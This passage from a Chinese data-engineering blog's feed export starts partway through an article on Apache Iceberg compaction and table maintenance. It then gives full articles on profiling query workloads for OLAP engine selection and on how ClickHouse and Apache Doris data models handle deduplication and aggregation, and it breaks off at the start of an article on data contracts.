<p>目标文件大小也不是全平台一个常量。对象存储吞吐、查询 split、压缩率和更新热点都会影响合适值。写入频繁的近线分区可以保留较小文件以降低重写冲突，进入稳定期后再合到更大的目标尺寸。</p>
<h2 id="File-Group-是资源与失败隔离单元"><a href="#File-Group-是资源与失败隔离单元" class="headerlink" title="File Group 是资源与失败隔离单元"></a>File Group 是资源与失败隔离单元</h2><p>Iceberg 的 <code>RewriteDataFiles</code> 会按 partition，再按大小把输入拆成 file groups。<code>max-file-group-size-bytes</code> 限制单组重写的数据量，源码注释明确说明，这是为了避免 TB 级分区一次排序重写耗尽集群资源；一个 group 不会跨输出分区。</p>
<p>这个边界很适合平台化。调度服务不用把“一张表 compaction”当成不可分割的大任务，而是先规划 groups，为每组估算 input bytes、文件数、预计输出文件数和资源，再按预算并发投递。</p>
<p>如果一组 100 GB、集群最多同时跑两组，那么峰值读写和 shuffle 比较容易控制。若直接对全表运行，Spark DAG 里可能同时铺开大量分区，既抢占业务计算资源，也增加对象存储请求和 Catalog 提交压力。</p>
<p>File group 还提供失败隔离。某个分区包含损坏文件或遇到并发冲突，不应迫使已经完成的其他独立分区全部重算。但开启 partial progress 前要理解它的代价：每一批成功 group 会产生独立 Iceberg commit，snapshot 与 metadata 增长更快，读者会看到逐步改善而不是一次切换。</p>
<p><code>partial-progress.enabled</code> 不是“容错开关”。启用后必须记录每次 commit 对应的 group、重写文件数、新文件数和失败原因；同时用 <code>partial-progress.max-commits</code> 给单次维护设置上限。否则一次维护可以在 Catalog 留下一长串难以解释的 snapshots。</p>
<h2 id="Bin-pack-与-Sort-解决的不是同一个问题"><a href="#Bin-pack-与-Sort-解决的不是同一个问题" class="headerlink" title="Bin-pack 与 Sort 解决的不是同一个问题"></a>Bin-pack 与 Sort 解决的不是同一个问题</h2><p>Bin-pack 主要改善文件尺寸。它把若干小文件重新打包到接近 target size，适合文件分布碎但数据布局尚可的表。Sort rewrite 还会按 sort order 重排记录，成本更高，却能让常用过滤字段的 min&#x2F;max 范围更紧，提高文件裁剪。</p>
<p>如果用户经常按 <code>tenant_id, event_time</code> 查询，而实时写入按到达顺序落文件，同一 tenant 的数据可能散在大量文件里。单纯 bin-pack 只会把小文件变大，散布关系没有改变；sort rewrite 才可能减少真正扫描的数据量。</p>
<p>但排序不是免费的。它引入 shuffle、spill 与更长执行时间，也放大与并发更新冲突的窗口。选择 sort 前，我会先用查询日志证明过滤模式稳定，再在少量分区做 A&#x2F;B：比较 rewrite 前后的 files selected、bytes scanned 和 p95 query latency，而不是只看平均文件大小。</p>
<p>对于 Merge-on-Read 表，还要把 delete 处理算进去。重写 data file 时需要应用有效 delete，生成干净的新数据；源码中的 <code>use-starting-sequence-number</code> 用起始 snapshot 的 sequence number 处理新文件，避免与更高序号的 equality deletes 冲突。维护任务不是离线清洁工，它必须服从表格式的并发语义。</p>
<h2 id="Compaction-会和正常写入争同一个提交点"><a href="#Compaction-会和正常写入争同一个提交点" class="headerlink" title="Compaction 会和正常写入争同一个提交点"></a>Compaction 会和正常写入争同一个提交点</h2><p>Iceberg 用乐观并发提交 snapshot。Compaction 读取一组旧 data files，生成替代文件，提交前必须确认输入文件仍然有效。如果实时 overwrite 或另一轮 compaction 已经移除其中某个文件，本次 rewrite 不能直接覆盖最新状态。</p>
<p>Append-only 表上的普通流式追加与旧文件重写通常可以并存，但 metadata pointer 仍可能发生提交竞争。更新频繁的表更复杂：新的 position&#x2F;equality delete 可能与正在重写的文件有关，错误处理会造成已删除记录重新出现。</p>
<p>所以服务要做调度避让。对每张表建立 writer window、maintenance window 与允许并发的操作矩阵：append 与老分区 bin-pack 可以并发，针对同一活跃分区的 overwrite、row-level update 和 sort rewrite 应尽量错开。冲突率持续升高时，减少并发、缩小 group 或后移冷却时间，比无限增加 commit retry 更有效。</p>
<p>我还会限制同一张表同时只有一个 planner。多个 compaction 任务各自扫描后选出重叠文件，即使执行资源充足，也会在提交时互相打掉。全局服务可以并行维护不同表，同表内部则用 file-group lease 防止输入集合重叠。</p>
<h2 id="维护项要分开，不要揉成一个“大清理”"><a href="#维护项要分开，不要揉成一个“大清理”" class="headerlink" title="维护项要分开，不要揉成一个“大清理”"></a>维护项要分开，不要揉成一个“大清理”</h2><p>Rewrite data files、rewrite manifests、expire snapshots 和 remove orphan files 解决四类不同问题。</p>
<p>Rewrite data files 改善数据文件尺寸或布局，会生成新 snapshot。Rewrite manifests 重组 metadata tree，适合写入顺序与查询过滤不一致、manifest 规划效率差的表。Expire snapshots 缩短可 time-travel 的历史，并让不再被任何保留 snapshot 引用的文件具备回收条件。Remove orphan files 才是查找未被 metadata 引用的文件。</p>
<p>执行顺序和保留策略必须明确。刚写出的文件在 commit 前也暂时不被 table metadata 引用，如果 orphan retention 小于最长写入时间，清理任务可能删掉正在进行的写入。Iceberg 0.13.1 文档还特别提醒，路径字符串表现不一致时，文件系统 listing 与 metadata 中的路径无法匹配，RemoveOrphanFiles 可能导致数据丢失。</p>
<p>我不会把这四项塞进同一个 catch-all 脚本。每项单独定义 SLA、权限和 dry-run 结果，尤其删除类动作要先输出候选清单、保留时间与路径规范化检查，再执行实际删除。</p>
<h2 id="验收要回答“值不值得”，不只回答“成功了”"><a href="#验收要回答“值不值得”，不只回答“成功了”" class="headerlink" title="验收要回答“值不值得”，不只回答“成功了”"></a>验收要回答“值不值得”，不只回答“成功了”</h2><p>一轮 Compaction 的 SUCCESS 至少要包含：选中多少 file groups、读取&#x2F;写入多少字节、重写多少旧文件、生成多少新文件、提交了哪些 snapshot、失败或跳过哪些 groups。只有 Spark job exit 0 不够。</p>
<p>效果验收分两次。提交后立刻检查文件 size 分布、delete file 关联数和 snapshot summary，确认物理结果符合计划；经过一个查询周期后，再看 planning time、opened files、scan bytes 和 p95 latency 是否改善。</p>
<p>如果每周花 20 TB IO，只把平均文件从 40 MB 合到 80 MB，查询几乎没变化，这个策略不值得继续。如果目标文件很漂亮，但流写两小时后又回到原状，应修上游 writer 的并行度、distribution 和 commit 频率，而不是加密 Compaction 调度。</p>
<p>服务化的关键不是长期运行一个进程，而是形成闭环：发现债务、选择收益最高的区域、在预算内执行、保留提交证据、验证效果，再调整下一轮策略。做到这一步，Compaction 才从“夜间脚本”变成表生命周期的一部分。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/iceberg/blob/a78aa2dbdb98634f26066c457cc1aef93166be9f/site/docs/maintenance.md#L105-L127">Iceberg 0.13.1 Maintenance：小文件与 <code>rewriteDataFiles</code></a></li>
<li><a href="https://github.com/apache/iceberg/blob/a78aa2dbdb98634f26066c457cc1aef93166be9f/site/docs/maintenance.md#L23-L58">Iceberg 0.13.1 Maintenance：snapshot expiration 与文件引用边界</a></li>
<li><a href="https://github.com/apache/iceberg/blob/a78aa2dbdb98634f26066c457cc1aef93166be9f/site/docs/maintenance.md#L75-L103">Iceberg 0.13.1 Maintenance：RemoveOrphanFiles 的 retention 与路径风险</a></li>
<li><a href="https://github.com/apache/iceberg/blob/a78aa2dbdb98634f26066c457cc1aef93166be9f/api/src/main/java/org/apache/iceberg/actions/RewriteDataFiles.java#L27-L48"><code>RewriteDataFiles</code>：partial progress 与提交次数上限</a></li>
<li><a href="https://github.com/apache/iceberg/blob/a78aa2dbdb98634f26066c457cc1aef93166be9f/api/src/main/java/org/apache/iceberg/actions/RewriteDataFiles.java#L50-L89"><code>RewriteDataFiles</code>：file group 大小、并发和 target file size</a></li>
</ul>
]]></content>
      <categories>
        <category>湖仓架构</category>
      </categories>
      <tags>
        <tag>Apache Iceberg</tag>
        <tag>Compaction</tag>
        <tag>表维护</tag>
      </tags>
  </entry>
  <entry>
    <title>OLAP 引擎怎么选：先把查询画像写出来，再跑 Benchmark</title>
    <url>//2022/07/20/olap-query-profile/</url>
    <content><![CDATA[<p>OLAP 选型会上最没用的一张表，是把十几个引擎放在列上，把实时写入、向量化、物化视图、Join、扩缩容逐项打勾。功能都支持，不代表对同一份业务负载有相同代价。</p>
<p>我更关心现有查询到底长什么样：多少 SQL 只查近一天，多少会扫一年；过滤条件是否命中排序键；是高并发点查，还是低并发大聚合；Join 的小表到底多小；数据更新后允许几秒、几分钟还是第二天可见。没有这份查询画像，Benchmark 很容易变成谁更会调参数。</p>
<p class="article-diagram-scroll"><img src="/images/articles/olap-query-profile.svg" class="lazyload" data-srcset="/images/articles/olap-query-profile.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="OLAP 选型从真实负载到可复现 Benchmark"></p>
<span id="more"></span>

<h2 id="不要从引擎能力表开始"><a href="#不要从引擎能力表开始" class="headerlink" title="不要从引擎能力表开始"></a>不要从引擎能力表开始</h2><p>ClickHouse MergeTree 把数据写成按主键排序的 parts，后台合并同分区 parts，并用稀疏主键索引定位 granules。Apache Doris 把数据先按 Partition，再按 Hash bucket 分成 Tablets，并提供 Duplicate、Aggregate、Unique 等数据模型。两边都能执行过滤、聚合和 Join，但建表方式决定了某类查询要读多少数据、搬多少网络、做多少运行时合并。</p>
<p>如果只问“支不支持明细查询”，答案都是支持。真正的问题是：明细查询有没有稳定的等值键，键是否在 ORDER BY&#x2F;prefix index 前缀，Doris bucket 是否能裁到少量 Tablets，ClickHouse sparse index 能否把范围缩到少量 granules。</p>
<p>同样，两个引擎都能做汇总。可如果报表总按固定维度聚合，Doris Aggregate model 或 Rollup 可以在存储层预聚合；ClickHouse 可以用 AggregatingMergeTree、Projection 或 Materialized View。选哪种不是看功能名称，而是看明细保留要求、聚合可结合性、写入时计算预算和查询维度变化频率。</p>
<p>所以第一阶段不安装集群。我会先从 SQL 网关、BI 查询日志和调度平台提取 2 到 4 周的真实 workload，按查询形状聚类，再找每类的代表 SQL。</p>
<h2 id="查询画像至少要有六组数字"><a href="#查询画像至少要有六组数字" class="headerlink" title="查询画像至少要有六组数字"></a>查询画像至少要有六组数字</h2><p>第一组是过滤形状。记录时间范围、等值&#x2F;范围字段、是否总带租户、过滤选择率和最终返回行数。<code>WHERE tenant_id=? AND event_time BETWEEN ...</code> 与只按 <code>event_time</code> 扫描，对排序键的要求完全不同。</p>
<p>第二组是扫描规模。不能只存 SQL 文本，要从现有引擎拿 scanned rows&#x2F;bytes、selected partitions&#x2F;files 和结果行数。扫描十亿行返回一百行，与扫描一百万行返回八十万行，瓶颈不会一样。</p>
<p>第三组是计算形状：GROUP BY 基数、distinct 数量、窗口函数、排序与 TopN、Join 的 build&#x2F;probe 大小、是否存在数据倾斜。尤其要保存 Join 后膨胀比例，很多“引擎慢”其实是上游模型把一对多关系重复展开。</p>
<p>第四组是并发。平均 QPS 没有意义，我会看峰值 1 分钟&#x2F;5 分钟并发、查询到达突发、长短查询混跑比例，以及 p50&#x2F;p95&#x2F;p99。十条 30 秒查询同时到达，与每秒一百条 50 ms 点查，需要不同的资源隔离和数据分布。</p>
<p>第五组是数据变化：每秒&#x2F;每批写入量、单次 batch 大小、可见性 SLA、update&#x2F;delete 比例、迟到窗口与重复数据处理。追加日志与频繁按主键修正的订单宽表，对 MergeTree family 或 Doris data model 的选择完全不同。</p>
<p>第六组是生命周期与成本：保留天数、冷热比例、副本数、压缩率、后台 merge&#x2F;compaction、备份恢复目标。查询延迟一样时，存储放大和后台 IO 可能差很多。</p>
<h2 id="排序、分区与分桶要按-Query-Family-验证"><a href="#排序、分区与分桶要按-Query-Family-验证" class="headerlink" title="排序、分区与分桶要按 Query Family 验证"></a>排序、分区与分桶要按 Query Family 验证</h2><p>ClickHouse 22.6 的 MergeTree 文档明确区分 <code>PARTITION BY</code> 与 <code>ORDER BY</code>：分区主要管理数据并做粗粒度裁剪，查询性能更多依赖排序键和稀疏索引；文档甚至提醒不要用客户 ID 做过细分区，而应考虑把它放到 ORDER BY 前部。</p>
<p>这是查询画像能直接指导 DDL 的地方。如果 80% 查询都先按 <code>tenant_id</code> 等值过滤，再按时间取范围，那么 <code>(tenant_id, event_time)</code> 很可能比 <code>(event_time, tenant_id)</code> 更符合索引前缀。可若多数查询跨全部 tenant 看某天指标，顺序可能反过来。不能只按“时间列最常用”决定。</p>
<p>Doris 的两级组织是 Range&#x2F;List Partition 加 Hash Bucket。1.1 文档把 bucket 列选择明确写成吞吐与并发的权衡：bucket 键较少时，带完整等值条件的点查可能只扫一个 bucket；键更多、分布更均匀，但不满足所有 bucket 等值条件的查询会扫描全部 buckets。</p>
<p>因此同一组数据至少要准备两到三种候选 DDL。Benchmark 不是只换引擎不换表，而是让每个引擎使用符合其机制、同时又可维护的建模方案。若给 ClickHouse 一个不匹配过滤前缀的 ORDER BY，再给 Doris 一个严重倾斜的 bucket key，结果没有比较价值。</p>
<h2 id="Benchmark-必须保留冷、热和混合负载"><a href="#Benchmark-必须保留冷、热和混合负载" class="headerlink" title="Benchmark 必须保留冷、热和混合负载"></a>Benchmark 必须保留冷、热和混合负载</h2><p>单条 SQL 连续跑十次，取最好成绩，是最容易制造漂亮数字的方法。生产用户不会等缓存预热好再发请求，也不会保证只有一种查询。</p>
<p>我会把测试分三类。冷读清理 page cache 或换未访问分区，测存储扫描与解压；热读重复同一查询，测缓存和执行效率；混合负载按真实到达率同时运行点查、大聚合、导出和写入，测排队、尾延迟和资源干扰。</p>
<p>每次结果至少记录：query ID、SQL hash、数据快照、DDL、并发、p50&#x2F;p95&#x2F;p99、scanned rows&#x2F;bytes、returned rows、CPU time、peak memory、network bytes 和后台任务状态。只比较 wall time，无法解释一次波动来自查询计划、merge、compaction 还是其他租户。</p>
<p>正确性先于性能。对每条代表 SQL，我会选一个可信基准结果，比较 row count、分组 key、聚合值和 null&#x2F;decimal&#x2F;timezone 语义。引擎把查询在 200 ms 内算错，不是性能优势。</p>
<h2 id="Join-能力要落到数据摆放"><a href="#Join-能力要落到数据摆放" class="headerlink" title="Join 能力要落到数据摆放"></a>Join 能力要落到数据摆放</h2><p>“支持分布式 Join”也不够。维表是广播到每个节点，还是按 key 重分布？事实表与维表能否 colocate？维表更新多久可见？一个理论上 50 MB 的小表，展开字符串和 hash table 后实际占多少内存？</p>
<p>Doris 的 Partition&#x2F;Tablet 分布与 Colocation&#x2F;Bucket Shuffle 类策略，会影响 Join 是否需要双边 shuffle。ClickHouse 分布式表的 shard key 与本地排序决定数据在哪个节点，但业务 Join key 不一定与 shard key 相同。画像里要记录 Join key 组合与数据倾斜，Benchmark 则必须用生产接近的节点数，单机结果无法体现网络重分布。</p>
<p>我还会把可避免的 Join 单列出来。很多看板查询每次连接十张维表，只是因为数据仓库沿用规范化模型。面向固定分析场景构建适度宽表或字典，可能比争论哪种 Join 算法更有效。引擎选型不应成为掩盖模型问题的比赛。</p>
<h2 id="结论应该按查询族给出"><a href="#结论应该按查询族给出" class="headerlink" title="结论应该按查询族给出"></a>结论应该按查询族给出</h2><p>最终报告不写“A 引擎比 B 快 30%”。我会按查询族给出适用性：高并发租户点查、近七天多维聚合、跨年明细导出、实时更新后的查询、复杂 Join 和低频自由探索，各自列出延迟、吞吐、资源成本、DDL 约束与运维风险。</p>
<p>某个引擎可能在日志追加和范围聚合上明显占优，另一个在主键更新、标准 SQL 和多表分析上更容易平台化。企业数据平台完全可能保留两种服务层，而不是逼一个引擎承担所有负载。</p>
<p>查询画像还有一个长期价值：上线后可以用相同指标检查负载是否漂移。最初 90% 查近一天，半年后大量跨月查询出现，原先的排序、分区和资源隔离可能已经不适合。选型不是一次考试，画像应成为容量与模型治理的基线。</p>
<p>先把谁在什么时候、用什么条件、扫多少数据、需要多快写清楚，才能讨论引擎。否则功能表越详细，结论越像主观偏好。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/ClickHouse/ClickHouse/blob/d5566f2f2dd7e21ed1472d8b0f33c2266ae103f8/docs/en/engines/table-engines/mergetree-family/mergetree.md#L10-L20">ClickHouse 22.6 MergeTree：排序、稀疏索引与分区的职责</a></li>
<li><a href="https://github.com/ClickHouse/ClickHouse/blob/d5566f2f2dd7e21ed1472d8b0f33c2266ae103f8/docs/en/engines/table-engines/mergetree-family/mergetree.md#L63-L80">ClickHouse 22.6 MergeTree：PARTITION BY 不应代替 ORDER BY 做查询优化</a></li>
<li><a href="https://github.com/ClickHouse/ClickHouse/blob/d5566f2f2dd7e21ed1472d8b0f33c2266ae103f8/docs/en/engines/table-engines/mergetree-family/mergetree.md#L160-L199">ClickHouse 22.6 MergeTree：part、granule 与 sparse primary index</a></li>
<li><a href="https://github.com/apache/doris/blob/a6eb47ac0875ed51291ed7b1cd990d40f7d901de/docs/en/getting-started/data-partition.md#L39-L45">Apache Doris 1.1：Partition、Bucket 与 Tablet 的物理边界</a></li>
<li><a href="https://github.com/apache/doris/blob/a6eb47ac0875ed51291ed7b1cd990d40f7d901de/docs/en/getting-started/data-partition.md#L251-L268">Apache Doris 1.1：bucket key 在查询吞吐与点查并发之间的权衡</a></li>
<li><a href="https://github.com/apache/doris/blob/a6eb47ac0875ed51291ed7b1cd990d40f7d901de/docs/en/getting-started/data-model-rollup.md#L39-L46">Apache Doris 1.1：Aggregate、Unique 与 Duplicate 数据模型</a></li>
</ul>
]]></content>
      <categories>
        <category>数据平台</category>
      </categories>
      <tags>
        <tag>OLAP</tag>
        <tag>ClickHouse</tag>
        <tag>Apache Doris</tag>
      </tags>
  </entry>
  <entry>
    <title>ClickHouse 与 Doris 怎么选：差别先落到数据模型，不是跑分</title>
    <url>//2022/07/22/clickhouse-doris-data-model/</url>
    <content><![CDATA[<p>ClickHouse 和 Apache Doris 放在一起比较时，很容易变成架构名词和 Benchmark 数字的拉锯。一个强调 MergeTree 和本地执行，一个强调 MPP、FE&#x2F;BE 和标准 SQL。对业务真正有影响的差别，往往更早发生在 <code>CREATE TABLE</code>：同一业务键来了两条数据，最终保留两条、替换一条还是聚合成一条？这个结果在什么阶段完成？</p>
<p>我不会先问哪个引擎快，而会先把数据分成追加明细、主键状态、可结合指标三类，再看各自的数据模型把成本放在写入、后台合并还是查询阶段。模型选错以后，硬件和参数只能缓解，无法改正语义。</p>
<p class="article-diagram-scroll"><img src="/images/articles/clickhouse-doris-data-model.svg" class="lazyload" data-srcset="/images/articles/clickhouse-doris-data-model.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ClickHouse 与 Doris 数据模型的成本位置"></p>
<span id="more"></span>

<h2 id="ClickHouse-的-PRIMARY-KEY-首先是排序与索引"><a href="#ClickHouse-的-PRIMARY-KEY-首先是排序与索引" class="headerlink" title="ClickHouse 的 PRIMARY KEY 首先是排序与索引"></a>ClickHouse 的 PRIMARY KEY 首先是排序与索引</h2><p>MergeTree 每次写入产生新的 data part，part 内按 primary&#x2F;sorting key 排序；同一 partition 的 parts 在后台合并。稀疏索引保存 granule 的 key marks，让查询按 key 范围跳过不相关数据。</p>
<p>这里最需要纠正的数据库直觉是：ClickHouse primary key 默认不要求唯一。官方 22.6 文档明确允许相同 primary key 的多行，后台 merge 也不保证相同 key 一定进入同一个 part。它首先服务排序、压缩和查询裁剪，不是 OLTP 数据库里的唯一约束。</p>
<p>所以日志事件表用普通 MergeTree 很自然。同一个 user 在同一秒产生多条事件，本来就应该全部保留。若业务是订单当前状态，直接把 <code>order_id</code> 放进 PRIMARY KEY，再多次 INSERT，不会自动得到唯一一行。</p>
<p><code>ORDER BY</code> 顺序也决定可裁剪的查询前缀。<code>(tenant_id, event_date, order_id)</code> 对按 tenant + 日期查询友好，只按 order_id 查可能仍要读大量 granules。把唯一性期望和查询排序键揉成一个设计，经常顾此失彼。</p>
<h2 id="ReplacingMergeTree-是最终去重，不是实时唯一键"><a href="#ReplacingMergeTree-是最终去重，不是实时唯一键" class="headerlink" title="ReplacingMergeTree 是最终去重，不是实时唯一键"></a>ReplacingMergeTree 是最终去重，不是实时唯一键</h2><p>ReplacingMergeTree 在 parts 合并时，对相同 sorting key 保留一条；指定 <code>ver</code> 时保留最大版本。它适合后台清理重复、节省空间，但官方文档把边界说得很清楚：dedup 只在 merge 时发生，merge 的时间不可预测，不能保证查询时没有重复。</p>
<p>这条语义对 CDC 特别关键。上游同一订单先写 version 10，又写 version 11，在相关 parts 尚未合并前，普通查询可能看到两行。查询可以使用 <code>FINAL</code> 获取合并后的视图，但这会把额外合并工作放到读时，不能给所有大范围报表无条件加上。</p>
<p>我会要求业务明确三件事：是否允许短时间多版本共存；查询是否都能按 <code>argMax(value, version)</code> 或同类逻辑得到最终状态；版本列能否严格单调并处理乱序。任何一项答不出来，都不能把 ReplacingMergeTree 当成“支持主键更新”。</p>
<p>SummingMergeTree 和 AggregatingMergeTree 也遵循类似思路：后台 merge 可以折叠数据，但查询仍应按最终聚合语义写 SQL，不能假设所有 parts 已经合成一行。后台 merge 是渐进优化，不是用户可观察结果的唯一正确性屏障。</p>
<h2 id="Doris-把模型语义写进表定义"><a href="#Doris-把模型语义写进表定义" class="headerlink" title="Doris 把模型语义写进表定义"></a>Doris 把模型语义写进表定义</h2><p>Doris 1.1 文档把数据模型分为 Aggregate、Uniq 和 Duplicate。</p>
<p>Duplicate Model 完整保留导入行，<code>DUPLICATE KEY</code> 主要指定底层排序列。它对应追加明细和日志，语义上最接近普通 MergeTree：相同行可以存在，重点是利用有序存储和前缀索引加速过滤。</p>
<p>Aggregate Model 把列分成 Key 与 Value。相同 Key 的 Value 按 SUM、REPLACE、MAX、MIN 等聚合类型合并。Doris 会在单批导入 ETL、BE Compaction 和查询三个阶段逐步聚合；物理上可能尚未完全合并，但查询端必须呈现最终聚合结果。</p>
<p>Unique Model 在当时的实现里是 Aggregate + REPLACE 的特殊表达：Key 保持唯一，Value 使用 REPLACE。它更贴近“按业务主键取最新状态”的表，但 latest 的确定方式仍要看导入顺序和版本设计，不能假定网络后到的数据就是业务最新。</p>
<p>这种模型化做法的优势，是查询者面对一个明确的最终语义；代价是建表时就要决定哪些列属于 key、哪些值怎样聚合。一个指标原来用 SUM，后来发现需要保存每次明细或做 distinct，Aggregate Model 的物理语义可能限制后续分析。</p>
<h2 id="去重和聚合都要问“什么时候完成”"><a href="#去重和聚合都要问“什么时候完成”" class="headerlink" title="去重和聚合都要问“什么时候完成”"></a>去重和聚合都要问“什么时候完成”</h2><p>比较两边时，我会画一条时间线：load -&gt; visible -&gt; background merge&#x2F;compaction -&gt; query。然后逐项标注正确性发生在哪一段。</p>
<p>ClickHouse ReplacingMergeTree 的后台 merge 会减少重复，但普通查询在 merge 前可能看到多版本；正确查询要显式处理版本或使用 FINAL。Doris Aggregate&#x2F;Unique 允许物理聚合尚未完成，但查询阶段继续聚合，向用户返回模型定义的最终结果。</p>
<p>这不意味着一边一定更好。ClickHouse 把更多控制留给建表与查询设计，对高吞吐追加和可定制聚合很灵活；Doris 把模型语义和查询透明性做得更显式，数据平台更容易约束使用方式。真正的取舍是业务是否愿意在每条查询里携带最终态逻辑，以及能否接受读时成本。</p>
<p>测试更新模型时不能只做“插两条，等十分钟再查”。我会在后台 merge&#x2F;compaction 尚未发生时立刻查询，再在后台完成后查询，检查两个时刻的业务结果是否一致；同时测批量乱序、重复投递和版本相同的冲突行。</p>
<h2 id="Rollup-与预聚合要服从查询稳定性"><a href="#Rollup-与预聚合要服从查询稳定性" class="headerlink" title="Rollup 与预聚合要服从查询稳定性"></a>Rollup 与预聚合要服从查询稳定性</h2><p>Doris Rollup 从 Base table 生成独立物理存储，可以保留更少列、按更粗粒度聚合，optimizer 根据查询选择合适 Rollup。Aggregate Model 上，一个按 <code>city</code> 聚合的 Rollup 能显著减少报表扫描；Duplicate Model 上，Rollup 更多用来调整列顺序与前缀索引。</p>
<p>ClickHouse 也有 Materialized View、Projection 和 AggregatingMergeTree 等预计算手段。两边的共同问题不是“能不能建”，而是查询维度是否足够稳定。每增加一份物化结构，都增加写入计算、存储、副本、回填和 schema 变更成本。</p>
<p>我通常从 Top SQL 里找覆盖率。一个候选 Rollup&#x2F;Projection 能覆盖 40% 查询且指标可结合，价值明确；为了加速一条每周一次的自由分析，增加全量物化副本，多半得不偿失。上线后还要记录命中率，否则物化结构可能长期占资源却没有查询使用。</p>
<p>预聚合也会牺牲明细。只有 SUM 结果无法回答去重用户数变化，只有 last value 无法还原历史状态。数据模型层应保留一份可审计的明细来源，再为稳定服务场景构建聚合层，不要把唯一原始数据直接写成不可逆聚合。</p>
<h2 id="分布键与排序键是另一组正交选择"><a href="#分布键与排序键是另一组正交选择" class="headerlink" title="分布键与排序键是另一组正交选择"></a>分布键与排序键是另一组正交选择</h2><p>Doris 的 Partition + Bucket 决定 Tablet 分布和查询要访问多少 buckets，Key 列又影响排序、前缀索引和模型语义。它们相关但不等价。业务主键适合 Unique Key，不代表一定是最好的 bucket key；高基数 key 能均衡分布，点查也可能裁到少量 bucket，但 Join 与热点还要单独评估。</p>
<p>ClickHouse 本地 MergeTree 的 ORDER BY 决定排序和稀疏索引，Distributed table 的 shard key 决定行落到哪个 shard。只优化本地 ORDER BY，却让同一业务 key 散到不同 shards，去重和聚合就要跨节点；只按业务 key 分片，又可能造成超级 tenant 热点。</p>
<p>因此 DDL review 我会分两张表检查：一张是 logical model，写明重复、更新、聚合语义；另一张是 physical layout，写明 partition、bucket&#x2F;shard、sort key 与副本。不要用一个“主键”词覆盖所有职责。</p>
<h2 id="我的选择方式"><a href="#我的选择方式" class="headerlink" title="我的选择方式"></a>我的选择方式</h2><p>追加事件、查询以范围过滤和大聚合为主，团队能够严格设计 ORDER BY、shard 与最终态 SQL，我会认真评估 ClickHouse。业务大量使用标准 SQL、多表分析，主键状态与预聚合模型希望由平台统一约束，Doris 往往更容易落到数据开发流程里。</p>
<p>但这只是起点，不是结论。最终仍要用相同业务数据验证：写入吞吐、数据可见性、重复&#x2F;乱序结果、查询 p95、后台 merge&#x2F;compaction、扩容恢复和资源成本。尤其要在后台维护压力存在时跑混合负载，空闲集群的单 SQL 跑分不能代表生产。</p>
<p>ClickHouse 与 Doris 的差别不该被缩成“谁更快”。把一条重复数据从写入到查询的命运画出来，把一次聚合在哪几个阶段发生讲清楚，选型才真正落到了工程语义上。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/ClickHouse/ClickHouse/blob/d5566f2f2dd7e21ed1472d8b0f33c2266ae103f8/docs/en/engines/table-engines/mergetree-family/mergetree.md#L160-L174">ClickHouse 22.6 MergeTree：data parts、后台 merge 与 granule</a></li>
<li><a href="https://github.com/ClickHouse/ClickHouse/blob/d5566f2f2dd7e21ed1472d8b0f33c2266ae103f8/docs/en/engines/table-engines/mergetree-family/mergetree.md#L176-L199">ClickHouse 22.6 MergeTree：primary key 不要求唯一</a></li>
<li><a href="https://github.com/ClickHouse/ClickHouse/blob/d5566f2f2dd7e21ed1472d8b0f33c2266ae103f8/docs/en/engines/table-engines/mergetree-family/replacingmergetree.md#L6-L12">ClickHouse 22.6 ReplacingMergeTree：去重只在后台 merge 发生且不保证无重复</a></li>
<li><a href="https://github.com/ClickHouse/ClickHouse/blob/d5566f2f2dd7e21ed1472d8b0f33c2266ae103f8/docs/en/engines/table-engines/mergetree-family/replacingmergetree.md#L32-L43">ClickHouse 22.6 ReplacingMergeTree：sorting key 与 version 的保留规则</a></li>
<li><a href="https://github.com/apache/doris/blob/a6eb47ac0875ed51291ed7b1cd990d40f7d901de/docs/en/getting-started/data-model-rollup.md#L35-L96">Apache Doris 1.1：Aggregate Model 的 Key&#x2F;Value 与聚合类型</a></li>
<li><a href="https://github.com/apache/doris/blob/a6eb47ac0875ed51291ed7b1cd990d40f7d901de/docs/en/getting-started/data-model-rollup.md#L225-L237">Apache Doris 1.1：导入、Compaction、查询三个聚合阶段</a></li>
<li><a href="https://github.com/apache/doris/blob/a6eb47ac0875ed51291ed7b1cd990d40f7d901de/docs/en/getting-started/data-model-rollup.md#L235-L334">Apache Doris 1.1：Unique 与 Duplicate Model 的语义</a></li>
<li><a href="https://github.com/apache/doris/blob/a6eb47ac0875ed51291ed7b1cd990d40f7d901de/docs/en/getting-started/data-model-rollup.md#L336-L404">Apache Doris 1.1：Rollup 物理存储与查询命中</a></li>
</ul>
]]></content>
      <categories>
        <category>数据平台</category>
      </categories>
      <tags>
        <tag>ClickHouse</tag>
        <tag>Apache Doris</tag>
        <tag>数据模型</tag>
      </tags>
  </entry>
  <entry>
    <title>数据契约不是冻结 Schema：怎样让字段变化可检查、可迁移、可回滚</title>
    <url>//2022/08/13/data-contract-change-control/</url>
    <content><![CDATA[<p>数据契约一旦被理解成“上游不许改字段”，很快就会失效。业务一定会增加状态、调整口径、拆分字段，平台不可能靠审批把变化冻结。真正需要禁止的是未经识别、没有迁移窗口、出了问题无法回滚的变化。</p>
<p>我把契约看成生产者与消费者之间的变更协议。Schema 是其中可机器检查的一层，除此之外还要写清字段含义、主键、时间语义、空值、质量阈值、交付时效、owner 和弃用期限。契约的目标不是少改，而是让每次修改都有证据链。</p>
<p class="article-diagram-scroll"><img src="/images/articles/data-contract-change-control.svg" class="lazyload" data-srcset="/images/articles/data-contract-change-control.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="数据契约从变更提案到完成或撤回"></p>
<span id="more"></span>

